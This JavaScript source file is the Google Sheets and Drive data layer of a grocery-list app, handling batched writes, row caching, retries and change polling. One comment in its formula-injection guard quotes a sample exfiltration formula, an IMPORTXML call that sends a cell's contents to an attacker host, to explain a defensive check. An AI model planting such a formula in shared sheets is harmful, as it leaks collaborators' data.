/**
 * Google Sheets API v4 + Drive API v3 data layer for Valu Groceries.
 *
 * Same engine as Valu Finance: batched writes, row-index caching (verified before writes so a
 * collaborator inserting rows can never make us overwrite the wrong one), retry with backoff,
 * change detection via Drive modifiedTime polling, and a built-in in-memory Demo group.
 */

import GoogleAuth from './googleAuth.js';
import { SHEET_PREFIX } from './config.js';
import { ITEM_HEADERS, STORE_HEADERS } from './groceryLogic.js';
import { NUTRITION_HEADERS } from './nutritionLogic.js';
import {
  isDemoSheet, demoValuesForRange, demoGroupMeta, setDemoOverride, setDemoOverrides,
  demoAppendRows, demoUpdateRow, demoDeleteRows,
} from './demoData.js';

export { isDemoSheet, DEMO_SHEET_ID } from './demoData.js';

const SHEETS_BASE = 'https://sheets.googleapis.com/v4/spreadsheets';
const DRIVE_BASE  = 'https://www.googleapis.com/drive/v3/files';

export const TABS = {
  SETTINGS: 'Settings',
  STORES:   'Stores',
  ITEMS:    'Items',
  NUTRITION: 'Nutrition',
};

const TAB_HEADERS = {
  [TABS.SETTINGS]: [['Key', 'Value']],
  [TABS.STORES]:   [STORE_HEADERS],
  [TABS.ITEMS]:    [ITEM_HEADERS],
  [TABS.NUTRITION]: [NUTRITION_HEADERS],
};

const DEFAULT_SETTINGS = [
  ['groupName',    'My groceries'],
  ['baseCurrency', 'CAD'],
  ['trackPrices',  'true'],
  ['currencyRates', ''],
  ['createdAt',    ''],
  ['createdBy',    ''],
];

export const CURRENCIES = [
  { name: 'Brazilian Real', code: 'BRL' },
  { name: 'Canadian Dollar', code: 'CAD' },
  { name: 'Euro', code: 'EUR' },
  { name: 'US Dollar', code: 'USD' },
  { name: 'West African CFA Franc', code: 'XOF' },
  { name: 'Australian Dollar', code: 'AUD' },
  { name: 'British Pound', code: 'GBP' },
  { name: 'Chinese Yuan', code: 'CNY' },
  { name: 'Czech Koruna', code: 'CZK' },
  { name: 'Danish Krone', code: 'DKK' },
  { name: 'Hong Kong Dollar', code: 'HKD' },
  { name: 'Hungarian Forint', code: 'HUF' },
  { name: 'Indian Rupee', code: 'INR' },
  { name: 'Japanese Yen', code: 'JPY' },
  { name: 'Mexican Peso', code: 'MXN' },
  { name: 'New Zealand Dollar', code: 'NZD' },
  { name: 'Norwegian Krone', code: 'NOK' },
  { name: 'Polish Zloty', code: 'PLN' },
  { name: 'Singapore Dollar', code: 'SGD' },
  { name: 'South African Rand', code: 'ZAR' },
  { name: 'South Korean Won', code: 'KRW' },
  { name: 'Swedish Krona', code: 'SEK' },
  { name: 'Swiss Franc', code: 'CHF' },
  { name: 'Taiwan Dollar', code: 'TWD' },
  { name: 'Turkish Lira', code: 'TRY' },
];

/** "Valu Groceries: Family" -> "Family" */
export function groupNameFromTitle(title) {
  const t = String(title || '');
  return t.startsWith(SHEET_PREFIX) ? t.slice(SHEET_PREFIX.length) : t;
}

// ── Formula-injection guard ────────────────────────────────────────────────────

const PLAIN_NUMBER_RE = /^[+-]?(\d+([.,]\d*)?|[.,]\d+)(e[+-]?\d+)?$/i;

/**
 * Cells are written with valueInputOption=USER_ENTERED (so dates and numbers keep working), which
 * also means Google Sheets would EXECUTE any text that looks like a formula - for example an item
 * named `=IMPORTXML("https://attacker/?"&A1)` added by a collaborator on a shared group. This
 * prefixes such text with a single quote, which Sheets treats as "store as plain text" (the quote
 * itself is not stored or returned). Numbers like "-12.50" are left alone.
 */
export function neutralizeFormula(v) {
  if (typeof v !== 'string' || v === '') return v;
  const c = v[0];
  if (c === '=' || c === '@') return "'" + v;
  if ((c === '+' || c === '-') && !PLAIN_NUMBER_RE.test(v.trim())) return "'" + v;
  return v;
}

function safeRow(values) {
  return Array.isArray(values) ? values.map(neutralizeFormula) : values;
}

// ── Internal state ─────────────────────────────────────────────────────────────

const rowCache = new Map();           // "sheetId::tabName" -> Map<id, rowIndex>
const rowCacheBuiltAt = new Map();    // "sheetId::tabName" -> Date.now() when the cache was built
/** Row indexes older than this are re-verified before a write (collaborators may have inserted/deleted rows). */
const ROW_CACHE_VERIFY_AFTER_MS = 5000;
const modifiedTimeCache = new Map();  // spreadsheetId -> lastModifiedTime
const schemaChecked = new Set();      // spreadsheetIds whose tabs were verified this session
const _numericSheetIdCache = new Map();
let changeDetectionTimer = null;
let _onChangeDetected = null;
let _watchedSheetIds = [];
let visibilityListenerAdded = false;
/** When we last wrote to a sheet ourselves, so the change poller does not mistake our own edits for someone else's. */
let lastOwnWriteAt = 0;
const OWN_WRITE_WINDOW_MS = 15000;
function markWrite() { lastOwnWriteAt = Date.now(); }

// ── Retry helper ───────────────────────────────────────────────────────────────

async function fetchWithRetry(url, options = {}, maxRetries = 3) {
  let lastError;
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    const token = await GoogleAuth.getAccessToken();

    const opts = {
      ...options,
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json',
        ...(options.headers || {}),
      },
    };

    let nonRetryable = false;
    try {
      const res = await fetch(url, opts);
      if (res.ok) return res.json();

      if (res.status === 401 && attempt < maxRetries) {
        await GoogleAuth.handleAuthFailure();
        continue;
      }

      if (res.status === 429 && attempt < maxRetries) {
        const retryAfter = parseInt(res.headers.get('Retry-After') || '0', 10);
        const waitMs = retryAfter > 0 ? retryAfter * 1000 : Math.min(1000 * Math.pow(2, attempt), 16000);
        await new Promise((r) => setTimeout(r, waitMs));
        continue;
      }

      const body = await res.text();
      lastError = new Error(`Sheets API ${res.status}: ${body}`);
      if (res.status >= 400 && res.status < 500 && res.status !== 401 && res.status !== 429) {
        nonRetryable = true;
      }
    } catch (err) {
      if (err.message === 'popup_blocked' || err.message === 'refresh_failed') throw err;
      lastError = err;
    }
    if (nonRetryable) throw lastError;
    if (attempt < maxRetries) {
      await new Promise((r) => setTimeout(r, 1000 * Math.pow(2, attempt)));
    }
  }
  throw lastError;
}

// ── Row cache helpers ──────────────────────────────────────────────────────────

function cacheKey(spreadsheetId, tabName) {
  return `${spreadsheetId}::${tabName}`;
}

function buildRowCache(spreadsheetId, tabName, rows, idColumnIndex = 0) {
  const key = cacheKey(spreadsheetId, tabName);
  const map = new Map();
  rows.forEach((row, i) => {
    const id = row[idColumnIndex];
    if (id) map.set(String(id), i + 2); // +2: row 1 holds the headers and the API is 1-indexed
  });
  rowCache.set(key, map);
  rowCacheBuiltAt.set(key, Date.now());
}

function getCachedRowIndex(spreadsheetId, tabName, id) {
  const map = rowCache.get(cacheKey(spreadsheetId, tabName));
  return map ? map.get(String(id)) : undefined;
}

function isRowCacheFresh(spreadsheetId, tabName) {
  const builtAt = rowCacheBuiltAt.get(cacheKey(spreadsheetId, tabName));
  return !!builtAt && (Date.now() - builtAt) < ROW_CACHE_VERIFY_AFTER_MS;
}

/** Does the given sheet row still hold `id` in its ID column? (single-cell read) */
async function rowHasId(spreadsheetId, tabName, rowIndex, id, idColumnIndex = 0) {
  const col = String.fromCharCode(65 + idColumnIndex);
  const range = encodeURIComponent(`${tabName}!${col}${rowIndex}`);
  const data = await fetchWithRetry(`${SHEETS_BASE}/${spreadsheetId}/values/${range}`);
  const cell = data && data.values && data.values[0] ? data.values[0][0] : '';
  return String(cell ?? '') === String(id);
}

function invalidateCache(spreadsheetId, tabName) {
  if (tabName) {
    rowCache.delete(cacheKey(spreadsheetId, tabName));
    rowCacheBuiltAt.delete(cacheKey(spreadsheetId, tabName));
  } else {
    for (const k of [...rowCache.keys()]) {
      if (k.startsWith(spreadsheetId + '::')) { rowCache.delete(k); rowCacheBuiltAt.delete(k); }
    }
  }
}

/**
 * After appending rows, remember where they landed (the API reports the range) so the next edit of
 * a just-added row does not need to re-read the whole tab. Falls back to dropping the cache.
 */
function registerAppendedRows(spreadsheetId, tabName, rows, result) {
  const key = cacheKey(spreadsheetId, tabName);
  const map = rowCache.get(key);
  const range = result && result.updates && result.updates.updatedRange;
  const m = range && /!\D*(\d+)(?::\D*(\d+))?$/.exec(range);
  if (!map || !m) { invalidateCache(spreadsheetId, tabName); return; }
  const start = parseInt(m[1], 10);
  rows.forEach((r, i) => { if (r[0]) map.set(String(r[0]), start + i); });
}

// ── Public API ─────────────────────────────────────────────────────────────────

const SheetsApi = {

  // ── Read ───────────────────────────────────────────────────────────────────

  /**
   * @param {{unformatted?: boolean}} [opts] unformatted: numbers come back as real numbers (no
   *   locale formatting), which is what the data tabs use so "1.234" can never be misread.
   */
  async getValues(spreadsheetId, range, opts = {}) {
    if (!spreadsheetId) throw new Error('No spreadsheet ID provided');
    if (isDemoSheet(spreadsheetId)) return demoValuesForRange(range);
    const render = opts.unformatted ? '?valueRenderOption=UNFORMATTED_VALUE' : '';
    const data = await fetchWithRetry(`${SHEETS_BASE}/${spreadsheetId}/values/${encodeURIComponent(range)}${render}`);
    return data.values || [];
  },

  /** All data rows of a tab (row 2 onward). Builds/refreshes the row cache. */
  async getTabData(spreadsheetId, tabName, idColumnIndex = 0) {
    const rows = await this.getValues(spreadsheetId, `${tabName}!A2:Z`, { unformatted: tabName !== TABS.SETTINGS });
    buildRowCache(spreadsheetId, tabName, rows, idColumnIndex);
    return rows;
  },

  // ── Write ──────────────────────────────────────────────────────────────────

  async appendRow(spreadsheetId, tabName, values) {
    return this.appendRows(spreadsheetId, tabName, [values]);
  },

  async appendRows(spreadsheetId, tabName, rowsArray) {
    if (!rowsArray.length) return { spreadsheetId, updates: {} };
    if (isDemoSheet(spreadsheetId)) {
      demoAppendRows(tabName, rowsArray);
      return { spreadsheetId, updates: {} };
    }
    markWrite();
    const encoded = encodeURIComponent(`${tabName}!A:Z`);
    const result = await fetchWithRetry(
      `${SHEETS_BASE}/${spreadsheetId}/values/${encoded}:append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS`,
      { method: 'POST', body: JSON.stringify({ values: rowsArray.map(safeRow) }) }
    );
    registerAppendedRows(spreadsheetId, tabName, rowsArray, result);
    return result;
  },

  /** Update one row by ID. Uses the cached row index, verified first if it is not brand new. */
  async updateRow(spreadsheetId, tabName, id, values, idColumnIndex = 0) {
    if (isDemoSheet(spreadsheetId)) { demoUpdateRow(tabName, id, values); return { spreadsheetId, updates: {} }; }
    let rowIndex = getCachedRowIndex(spreadsheetId, tabName, id);

    // A cached row number can be stale if a collaborator inserted/deleted rows since it was built.
    // Writing to the wrong row would silently overwrite someone else's record, so when the cache
    // is not brand new, confirm that the row still holds this ID (one tiny single-cell read).
    if (rowIndex && !isRowCacheFresh(spreadsheetId, tabName)) {
      const stillThere = await rowHasId(spreadsheetId, tabName, rowIndex, id, idColumnIndex);
      if (!stillThere) {
        invalidateCache(spreadsheetId, tabName);
        rowIndex = undefined;
      }
    }

    if (!rowIndex) {
      await this.getTabData(spreadsheetId, tabName, idColumnIndex);
      rowIndex = getCachedRowIndex(spreadsheetId, tabName, id);
    }
    if (!rowIndex) throw new Error(`Row with ID "${id}" not found in ${tabName}`);

    markWrite();
    const range = encodeURIComponent(`${tabName}!A${rowIndex}:Z${rowIndex}`);
    // Row numbers do not change when a row is edited in place, so the cache stays valid.
    return fetchWithRetry(
      `${SHEETS_BASE}/${spreadsheetId}/values/${range}?valueInputOption=USER_ENTERED`,
      { method: 'PUT', body: JSON.stringify({ values: [safeRow(values)] }) }
    );
  },

  /** Delete rows by ID with a single batchUpdate (deleting from the bottom up keeps indexes valid). */
  async deleteRows(spreadsheetId, tabName, ids, idColumnIndex = 0) {
    if (isDemoSheet(spreadsheetId)) { demoDeleteRows(tabName, ids); return; }
    await this.getTabData(spreadsheetId, tabName, idColumnIndex);

    const rowIndices = [...new Set(ids)]
      .map((id) => getCachedRowIndex(spreadsheetId, tabName, id))
      .filter(Boolean)
      .sort((a, b) => b - a);
    if (rowIndices.length === 0) return;

    const numericSheetId = await this.getNumericSheetId(spreadsheetId, tabName);
    const requests = rowIndices.map((rowIdx) => ({
      deleteDimension: {
        range: { sheetId: numericSheetId, dimension: 'ROWS', startIndex: rowIdx - 1, endIndex: rowIdx },
      },
    }));

    await this.batchUpdate(spreadsheetId, requests);
    invalidateCache(spreadsheetId, tabName);
  },

  /**
   * Update many rows in one request (reorder, move to another store, check off several...).
   * @param {Array<{id, values}>} updates each has the row id and the FULL new row
   */
  async batchUpdateRows(spreadsheetId, tabName, updates, idColumnIndex = 0) {
    if (!updates.length) return;
    if (isDemoSheet(spreadsheetId)) { updates.forEach((u) => demoUpdateRow(tabName, u.id, u.values)); return; }
    // Stale row numbers would write to the wrong rows, so make sure the cache is recent.
    if (!rowCache.has(cacheKey(spreadsheetId, tabName)) || !isRowCacheFresh(spreadsheetId, tabName)) {
      await this.getTabData(spreadsheetId, tabName, idColumnIndex);
    }

    const data = updates.map((u) => {
      const rowIndex = getCachedRowIndex(spreadsheetId, tabName, u.id);
      if (!rowIndex) return null;
      return { range: `${tabName}!A${rowIndex}:Z${rowIndex}`, values: [safeRow(u.values)] };
    }).filter(Boolean);
    if (data.length === 0) return;

    markWrite();
    await fetchWithRetry(`${SHEETS_BASE}/${spreadsheetId}/values:batchUpdate`, {
      method: 'POST',
      body: JSON.stringify({ valueInputOption: 'USER_ENTERED', data }),
    });
  },

  // ── Structural operations ──────────────────────────────────────────────────

  async batchUpdate(spreadsheetId, requests) {
    if (isDemoSheet(spreadsheetId)) return { spreadsheetId, replies: [] };
    markWrite();
    return fetchWithRetry(`${SHEETS_BASE}/${spreadsheetId}:batchUpdate`, {
      method: 'POST',
      body: JSON.stringify({ requests }),
    });
  },

  async getNumericSheetId(spreadsheetId, tabName) {
    if (isDemoSheet(spreadsheetId)) return 0;
    const key = `${spreadsheetId}::${tabName}`;
    if (_numericSheetIdCache.has(key)) return _numericSheetIdCache.get(key);
    const data = await fetchWithRetry(`${SHEETS_BASE}/${spreadsheetId}?fields=sheets.properties`);
    for (const s of data.sheets || []) {
      _numericSheetIdCache.set(`${spreadsheetId}::${s.properties.title}`, s.properties.sheetId);
    }
    if (!_numericSheetIdCache.has(key)) throw new Error(`Tab "${tabName}" not found`);
    return _numericSheetIdCache.get(key);
  },

  /**
   * Make sure every tab this app needs exists (shared sheets, imports and future schema additions).
   * One metadata read per spreadsheet per session; creates only what is missing.
   */
  async ensureSchema(spreadsheetId) {
    if (isDemoSheet(spreadsheetId) || schemaChecked.has(spreadsheetId)) return;
    const data = await fetchWithRetry(`${SHEETS_BASE}/${spreadsheetId}?fields=sheets.properties`);
    const have = new Set((data.sheets || []).map((s) => s.properties.title));
    const missing = Object.keys(TAB_HEADERS).filter((t) => !have.has(t));
    if (missing.length) {
      await this.batchUpdate(spreadsheetId, missing.map((title) => ({ addSheet: { properties: { title } } })));
      await fetchWithRetry(`${SHEETS_BASE}/${spreadsheetId}/values:batchUpdate`, {
        method: 'POST',
        body: JSON.stringify({
          valueInputOption: 'RAW',
          data: missing.map((t) => ({ range: `${t}!A1`, values: TAB_HEADERS[t] })),
        }),
      });
      for (const k of [..._numericSheetIdCache.keys()]) if (k.startsWith(spreadsheetId + '::')) _numericSheetIdCache.delete(k);
    }
    // Sheets made by an earlier version have fewer Items columns: add the missing header cells.
    if (have.has(TABS.ITEMS)) {
      const head = await fetchWithRetry(`${SHEETS_BASE}/${spreadsheetId}/values/${encodeURIComponent(TABS.ITEMS + '!A1:Z1')}`);
      const cells = (head.values && head.values[0]) || [];
      if (cells.length > 0 && cells.length < ITEM_HEADERS.length) {
        await fetchWithRetry(`${SHEETS_BASE}/${spreadsheetId}/values/${encodeURIComponent(TABS.ITEMS + '!A1')}?valueInputOption=RAW`, {
          method: 'PUT',
          body: JSON.stringify({ values: [ITEM_HEADERS] }),
        });
      }
    }
    schemaChecked.add(spreadsheetId);
  },

  // ── Spreadsheet management ─────────────────────────────────────────────────

  /** Create a new group spreadsheet with all tabs, headers and default settings. */
  async createSpreadsheet(groupName, userEmail, settings = {}) {
    const title = `${SHEET_PREFIX}${groupName}`;
    const now = new Date().toISOString();

    const result = await fetchWithRetry(SHEETS_BASE, {
      method: 'POST',
      body: JSON.stringify({
        properties: { title },
        sheets: Object.keys(TAB_HEADERS).map((tabName, i) => ({ properties: { title: tabName, index: i } })),
      }),
    });

    const spreadsheetId = result.spreadsheetId;
    if (!spreadsheetId) throw new Error('Google Sheets did not return a spreadsheet ID');

    await fetchWithRetry(`${SHEETS_BASE}/${spreadsheetId}/values:batchUpdate`, {
      method: 'POST',
      body: JSON.stringify({
        valueInputOption: 'RAW',
        data: Object.entries(TAB_HEADERS).map(([tabName, headers]) => ({ range: `${tabName}!A1`, values: headers })),
      }),
    });

    const merged = Object.fromEntries(DEFAULT_SETTINGS);
    Object.assign(merged, settings, { groupName, createdAt: now, createdBy: userEmail || '' });
    await fetchWithRetry(
      `${SHEETS_BASE}/${spreadsheetId}/values/${encodeURIComponent('Settings!A2:B')}:append?valueInputOption=RAW&insertDataOption=INSERT_ROWS`,
      { method: 'POST', body: JSON.stringify({ values: Object.entries(merged).map(([k, v]) => [k, String(v)]) }) }
    );

    schemaChecked.add(spreadsheetId);
    return { id: spreadsheetId, name: title };
  },

  // ── Settings (key-value tab) ───────────────────────────────────────────────

  async getSettings(spreadsheetId) {
    const rows = await this.getValues(spreadsheetId, 'Settings!A2:B');
    const settings = {};
    for (const row of rows) {
      if (row[0]) settings[row[0]] = row[1] === undefined || row[1] === null ? '' : String(row[1]);
    }
    return settings;
  },

  async updateSetting(spreadsheetId, key, value) {
    return this.updateSettings(spreadsheetId, { [key]: value });
  },

  async updateSettings(spreadsheetId, settingsObj) {
    if (isDemoSheet(spreadsheetId)) { setDemoOverrides(settingsObj); return; }
    markWrite();
    const rows = await this.getValues(spreadsheetId, 'Settings!A2:B');
    const updates = [];
    const appends = [];

    for (const [key, value] of Object.entries(settingsObj)) {
      const i = rows.findIndex((r) => r[0] === key);
      if (i >= 0) updates.push({ range: `Settings!A${i + 2}:B${i + 2}`, values: [[key, String(value)]] });
      else appends.push([key, String(value)]);
    }

    if (updates.length > 0) {
      await fetchWithRetry(`${SHEETS_BASE}/${spreadsheetId}/values:batchUpdate`, {
        method: 'POST',
        body: JSON.stringify({ valueInputOption: 'RAW', data: updates }),
      });
    }
    if (appends.length > 0) {
      // RAW so a value such as "true" stays text instead of becoming a boolean.
      await fetchWithRetry(
        `${SHEETS_BASE}/${spreadsheetId}/values/${encodeURIComponent('Settings!A:B')}:append?valueInputOption=RAW&insertDataOption=INSERT_ROWS`,
        { method: 'POST', body: JSON.stringify({ values: appends }) }
      );
    }
  },

  // ── Drive API ──────────────────────────────────────────────────────────────

  /** All Valu Groceries spreadsheets this app can see (drive.file scope: created or picked here). */
  async listSpreadsheets() {
    const q = `mimeType='application/vnd.google-apps.spreadsheet' and trashed=false`;
    const data = await fetchWithRetry(
      `${DRIVE_BASE}?q=${encodeURIComponent(q)}&fields=${encodeURIComponent('files(id,name,modifiedTime,shared,owners)')}&orderBy=modifiedTime desc&pageSize=100`
    );
    return (data.files || []).filter((f) => f.name.startsWith(SHEET_PREFIX));
  },

  async renameSpreadsheet(fileId, newName) {
    if (isDemoSheet(fileId)) return;
    await fetchWithRetry(`${DRIVE_BASE}/${fileId}`, { method: 'PATCH', body: JSON.stringify({ name: newName }) });
  },

  async getFileModifiedTime(fileId) {
    if (isDemoSheet(fileId)) return demoGroupMeta().modifiedTime;
    const data = await fetchWithRetry(`${DRIVE_BASE}/${fileId}?fields=modifiedTime`);
    return data.modifiedTime;
  },

  async getFileUpdateInfo(fileId) {
    if (isDemoSheet(fileId)) return { modifiedTime: demoGroupMeta().modifiedTime, lastModifyingUser: null };
    const data = await fetchWithRetry(`${DRIVE_BASE}/${fileId}?fields=modifiedTime,lastModifyingUser`);
    return { modifiedTime: data.modifiedTime, lastModifyingUser: data.lastModifyingUser || null };
  },

  // ── Change detection (shared lists update on their own) ────────────────────

  startChangeDetection(spreadsheetIds, callback, intervalMs = 20000) {
    _onChangeDetected = callback;
    _watchedSheetIds = spreadsheetIds;
    for (const id of spreadsheetIds) {
      if (!modifiedTimeCache.has(id)) modifiedTimeCache.set(id, null);
    }

    this.stopChangeDetection();
    // Don't poll Drive while the tab/app is in the background (saves API quota and battery).
    changeDetectionTimer = setInterval(() => {
      if (typeof document !== 'undefined' && document.hidden) return;
      this.checkForChanges();
    }, intervalMs);

    // Catch up right away when the user comes back to the app.
    if (!visibilityListenerAdded && typeof document !== 'undefined') {
      visibilityListenerAdded = true;
      document.addEventListener('visibilitychange', () => {
        if (!document.hidden && changeDetectionTimer) this.checkForChanges();
      });
    }
  },

  stopChangeDetection() {
    if (changeDetectionTimer) {
      clearInterval(changeDetectionTimer);
      changeDetectionTimer = null;
    }
  },

  async checkForChanges() {
    for (const id of _watchedSheetIds) {
      if (isDemoSheet(id)) continue;
      try {
        const modTime = await this.getFileModifiedTime(id);
        const prev = modifiedTimeCache.get(id);
        modifiedTimeCache.set(id, modTime);
        // Edits we just made ourselves are not "someone else changed the list".
        if (prev && modTime !== prev && _onChangeDetected && Date.now() - lastOwnWriteAt > OWN_WRITE_WINDOW_MS) _onChangeDetected(id);
      } catch {
        // Skip - will retry next interval
      }
    }
  },

  // ── Utility ────────────────────────────────────────────────────────────────

  generateId() {
    // "v_<time>_<6 chars>" with cryptographic randomness, so two people adding rows in the same
    // millisecond cannot realistically collide.
    const rnd = crypto.getRandomValues(new Uint8Array(6));
    return 'v_' + Date.now().toString(36) + '_' + Array.from(rnd, (b) => (b % 36).toString(36)).join('');
  },

  invalidateCache,
};

export { setDemoOverride };
export default SheetsApi;
